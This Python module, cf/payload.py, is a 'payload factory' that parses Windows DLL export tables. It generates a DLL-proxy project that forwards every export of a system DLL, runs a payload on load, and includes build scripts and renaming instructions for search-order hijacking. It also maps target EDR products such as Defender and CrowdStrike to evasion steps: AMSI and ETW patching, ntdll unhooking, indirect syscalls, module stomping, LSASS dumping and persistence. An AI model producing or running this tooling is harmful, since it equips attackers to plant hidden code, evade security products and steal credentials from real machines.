# language: Python 3.11+, file: cf/payload.py
# *payload factory — DLL proxying, PE export parsing, evasion header source*
from __future__ import annotations

import os
import struct
from collections.abc import Sequence
from functools import cache
from pathlib import Path
from typing import Any

from .util import write_text

IMAGE_DOS_SIGNATURE = 0x5A4D
IMAGE_NT_SIGNATURE = 0x00004550
IMAGE_DIRECTORY_ENTRY_EXPORT = 0


def _resolve_pe(path: str | Path) -> Path:
    """Bare names ('vbscript.dll') are looked up next to the process, then in
    %SystemRoot%\\System32, so the common case needs no full path."""
    p = Path(os.path.expandvars(str(path)))
    if p.is_file():
        return p
    if not p.is_absolute():
        system32 = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / p.name
        if system32.is_file():
            return system32
    raise FileNotFoundError(
        f"dll not found: {path} (searched the working directory and "
        "%SystemRoot%\\System32)"
    )


# ─── PE export reader (no external deps) ───
def _rva_to_off(data: bytes, rva: int, sections: list[tuple[int, int, int]]) -> int | None:
    for va, vs, raw in sections:
        if va <= rva < va + max(vs, 1):
            return raw + (rva - va)
    return None


def exports_from_dll(path: str | Path) -> list[dict[str, Any]]:
    """Named exports with their ordinals, read straight from the export
    directory. Forwarders are marked so the proxy does not re-forward."""
    data = _resolve_pe(path).read_bytes()
    if len(data) < 0x40 or struct.unpack_from("<H", data, 0)[0] != IMAGE_DOS_SIGNATURE:
        raise ValueError(f"not a PE file: {path}")
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    if struct.unpack_from("<I", data, e_lfanew)[0] != IMAGE_NT_SIGNATURE:
        raise ValueError(f"bad NT header: {path}")
    coff = e_lfanew + 4
    nsections = struct.unpack_from("<H", data, coff + 2)[0]
    optsz = struct.unpack_from("<H", data, coff + 16)[0]
    opt = coff + 20
    magic = struct.unpack_from("<H", data, opt)[0]
    dd_off = opt + (96 if magic == 0x10B else 112)
    exp_rva, exp_size = struct.unpack_from("<II", data, dd_off + IMAGE_DIRECTORY_ENTRY_EXPORT * 8)
    if exp_rva == 0:
        return []

    sections: list[tuple[int, int, int]] = []
    sec_off = opt + optsz
    for i in range(nsections):
        off = sec_off + i * 40
        va = struct.unpack_from("<I", data, off + 12)[0]
        vs = struct.unpack_from("<I", data, off + 8)[0]
        raw = struct.unpack_from("<I", data, off + 20)[0]
        rawsz = struct.unpack_from("<I", data, off + 16)[0]
        sections.append((va, max(vs, rawsz), raw))

    exp_off = _rva_to_off(data, exp_rva, sections)
    if exp_off is None:
        raise ValueError("export directory not mapped")
    nfunc, nnames, _, _, base = struct.unpack_from("<IIIII", data, exp_off + 16)
    addr_rva, names_rva, ords_rva = struct.unpack_from("<III", data, exp_off + 28)
    funcs_off = _rva_to_off(data, addr_rva, sections)
    names_off = _rva_to_off(data, names_rva, sections)
    ords_off = _rva_to_off(data, ords_rva, sections)
    if None in (funcs_off, names_off, ords_off):
        raise ValueError("export tables not mapped")

    out: list[dict[str, Any]] = []
    name_by_index: dict[int, str] = {}
    for i in range(nnames):
        name_rva = struct.unpack_from("<I", data, names_off + i * 4)[0]
        name_off = _rva_to_off(data, name_rva, sections)
        if name_off is None:
            continue
        end = data.find(b"\x00", name_off)
        name = data[name_off:end].decode("ascii", "replace")
        ordinal_idx = struct.unpack_from("<H", data, ords_off + i * 2)[0]
        name_by_index[ordinal_idx] = name
    for idx in range(nfunc):
        func_rva = struct.unpack_from("<I", data, funcs_off + idx * 4)[0]
        if func_rva == 0:
            continue
        is_forwarder = exp_rva <= func_rva < exp_rva + exp_size
        out.append(
            {
                "ordinal": base + idx,
                "name": name_by_index.get(idx),
                "forwarder": is_forwarder,
            }
        )
    return out


def _def_line(entry: dict[str, Any], module: str) -> str | None:
    ordinal = int(entry["ordinal"])
    name = entry.get("name")
    if name:
        return f"    {name}={module}.{name} @{ordinal}"
    return None  # ordinal-only exports cannot be expressed as a forwarder


# ─── factory ───
class PayloadFactory:
    """Build coordinator: dump the host DLL's exports, emit a proxy project
    that forwards every one of them, and drop the evasion header alongside."""

    @staticmethod
    def generate_dll_proxy(
        target_dll: str,
        output_dir: str = "./build",
        exports: Sequence[Any] | None = None,
        payload_entry: str = "cf_payload",
    ) -> dict[str, Any]:
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        module = Path(target_dll).name

        if exports is None:
            parsed = exports_from_dll(target_dll)
        else:
            parsed = []
            for i, item in enumerate(exports):
                if isinstance(item, dict):
                    parsed.append(item)
                else:
                    parsed.append({"ordinal": i + 1, "name": str(item),
                                   "forwarder": False})

        skipped: list[int] = []
        lines: list[str] = []
        for entry in parsed:
            line = _def_line(entry, module)
            if line is None:
                skipped.append(int(entry["ordinal"]))
            else:
                lines.append(line)
        if not lines:
            raise ValueError(
                f"{module}: no named exports to forward — a proxy cannot bind"
            )

        written = [
            write_text(
                out / "payload_factory.hpp", PayloadFactory._payload_hpp_source()
            ),
            write_text(
                out / "proxy.def",
                f"LIBRARY {Path(module).stem}\nEXPORTS\n" + "\n".join(lines) + "\n",
            ),
            write_text(
                out / "proxy.cpp", PayloadFactory._proxy_main_source(payload_entry)
            ),
            write_text(out / "build.bat", PayloadFactory._build_bat()),
        ]

        return {
            "output_dir": str(out),
            "module": module,
            "forwarded": len(lines),
            "ordinal_only_skipped": skipped,
            "files": [str(p) for p in written],
            "build": f'cd /d "{out}" && build.bat',
            "usage": (
                f"rename proxy.dll to {module} and place it beside the host exe "
                f"(same directory wins over System32)"
            ),
        }

    @staticmethod
    def _build_bat() -> str:
        return (
            "@echo off\r\nsetlocal\r\n"
            "set VCVARS=\r\n"
            'for %%E in (Community Professional Enterprise BuildTools) do (\r\n'
            '  if exist "C:\\Program Files\\Microsoft Visual Studio\\2022\\%%E\\'
            'VC\\Auxiliary\\Build\\vcvars64.bat" (\r\n'
            '    set "VCVARS=C:\\Program Files\\Microsoft Visual Studio\\2022\\%%E\\'
            'VC\\Auxiliary\\Build\\vcvars64.bat"\r\n    goto :found\r\n  )\r\n'
            ")\r\n"
            'echo visual studio build tools not found 1>&2\r\nexit /b 1\r\n'
            ":found\r\n"
            'call "%VCVARS%" >nul\r\n'
            "cl /nologo /O2 /GS- /GL /std:c++17 /utf-8 /LD proxy.cpp "
            "/link /DEF:proxy.def /OUT:proxy.dll\r\n"
            "if errorlevel 1 exit /b 1\r\n"
            "del /q *.obj *.lib *.exp 2>nul\r\n"
            "echo built proxy.dll\r\n"
        )

    @staticmethod
    def _proxy_main_source(payload_entry: str) -> str:
        return f"""// language: C++, file: proxy.cpp
// *DLL proxying — every original export forwarded, payload runs on attach*
#include <windows.h>

extern "C" __declspec(dllexport) void {payload_entry}();

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        DisableThreadLibraryCalls(hinst);
        HANDLE h = CreateThread(nullptr, 0, [](LPVOID) -> DWORD {{
            // primitives live in payload_factory.hpp — call them here
            {payload_entry}();
            return 0;
        }}, nullptr, 0, nullptr);
        if (h) CloseHandle(h);
    }}
    return TRUE;
}}
"""

    @staticmethod
    def _payload_hpp_source() -> str:
        return _payload_hpp()

    @staticmethod
    def build_chain_for_target(
        os_name: str, edr_hint: str = "", c2_url: str = ""
    ) -> dict[str, Any]:
        hint = edr_hint.lower()
        if os_name == "windows":
            base = [
                "unhook_ntdll",
                "patch_amsi",
                "patch_etw",
                "resolve_ssn",
                "build_indirect_stub",
                "find_syscall_gadget",
                "timing_sane",
                "is_vm_cpuid",
                "sleep_masked",
            ]
            if any(k in hint for k in ("defender", "crowdstrike")):
                base += ["spawn_spoofed", "module_stomp"]
            if any(k in hint for k in ("sentinel", "carbon", "mcafee")):
                base += ["module_stomp", "iat_hook"]
            if any(k in hint for k in ("admin", "domain")):
                base += ["enable_privilege", "dump_lsass"]
            return {
                "os": "windows",
                "primitives": base,
                "compile": (
                    "cl /nologo /O2 /GS- /GL /std:c++17 /utf-8 /LD payload.cpp "
                    "/link /DEF:exports.def"
                ),
                "notes": [
                    "unhook_ntdll first — everything below it reads ntdll",
                    (
                        "resolve_ssn + find_syscall_gadget, then the indirect stub "
                        "for any syscall that leaves a usermode trace"
                    ),
                    "sleep_masked between stages; keep RW pages read-only after use",
                ],
            }
        if os_name == "macos":
            return {
                "os": "macos",
                "primitives": ["dyld_hijack", "posix_spawn_spoof", "launchagent_persist"],
                "compile": "clang -O2 -dynamiclib payload.m -o payload.dylib",
            }
        if os_name == "linux":
            return {
                "os": "linux",
                "primitives": ["ld_preload", "ptrace_anti_debug", "systemd_persist"],
                "compile": "gcc -O2 -fPIC -shared payload.c -o payload.so",
            }
        return {"error": f"unsupported os: {os_name}"}


@cache
def _payload_hpp() -> str:
    return (
        Path(__file__).resolve().parent / "data" / "payload_factory.hpp"
    ).read_text(encoding="utf-8")
